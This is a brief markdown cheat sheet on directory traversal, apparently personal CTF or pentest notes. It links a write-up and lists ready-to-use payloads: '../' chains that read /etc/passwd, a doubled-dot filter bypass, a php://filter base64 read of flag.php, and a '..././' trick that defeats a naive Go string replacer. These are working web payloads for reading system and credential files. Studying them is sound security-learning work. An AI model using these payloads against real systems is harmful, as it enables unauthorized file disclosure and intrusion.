# Directory Traversal

[Directory traversal in PDF viewing application. Leading to full database takeover](https://medium.com/@wrinnsec/directory-traversal-in-pdf-viewing-application-leading-to-full-database-takeover-376e68eadd86)

```jsx
../../../../../etc/passwd
/etc/passwd
....//....//....//....//etc/passwd
php://filter/read=convert.base64-encode/resource=flag.php
```

```python

var  PathReplacer  =  strings.NewReplacer(
	"../", "",
)
-> ..././
```